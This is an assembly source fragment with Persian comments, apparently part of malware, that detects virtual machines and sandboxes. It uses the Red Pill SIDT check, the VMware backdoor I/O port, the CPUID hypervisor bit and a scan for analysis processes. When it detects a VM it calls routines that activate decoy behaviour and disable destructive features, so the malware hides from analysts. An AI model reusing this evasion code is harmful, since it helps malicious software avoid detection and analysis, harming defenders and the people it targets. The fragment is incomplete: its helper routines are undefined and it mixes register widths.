section .text

; تشخیص محیط‌های مجازی و سندباکس
detect_virtual_environment:
    ; تکنیک Red Pill
    sidt [idtr]
    mov eax, [idtr + 2]  ; Base address high bits
    cmp eax, 0xFF000000
    ja .virtual_detected

    ; تکنیک VMware backdoor
    mov eax, 0x564D5868  ; 'VMXh'
    xor ebx, ebx
    mov ecx, 10
    mov edx, 0x5658
    in eax, dx
    cmp ebx, 0x564D5868
    je .virtual_detected

    ; تکنیک VirtualPC
    mov eax, 0x1
    cpuid
    test ecx, (1 << 31)  ; Hypervisor bit
    jnz .virtual_detected

    ; تکنیک Sandbox
    call check_running_processes
    test eax, eax
    jnz .sandbox_detected

    ret

.virtual_detected:
    call virtual_env_response
    ret

.sandbox_detected:
    call sandbox_response
    ret

; پاسخ به تشخیص محیط مجازی
virtual_env_response:
    ; فعال‌سازی رفتار فریبنده
    call activate_decoy_mode
    
    ; غیرفعال‌سازی ویژگی‌های مخرب
    call disable_destructive_features
    ret

; تشخیص فرایندهای تحلیل
check_running_processes:
    mov rdi, process_list
    mov rcx, num_processes
.check_loop:
    call find_process_by_name
    test rax, rax
    jnz .process_found
    add rdi, 8
    loop .check_loop
    xor eax, eax
    ret

.process_found:
    mov eax, 1
    ret
    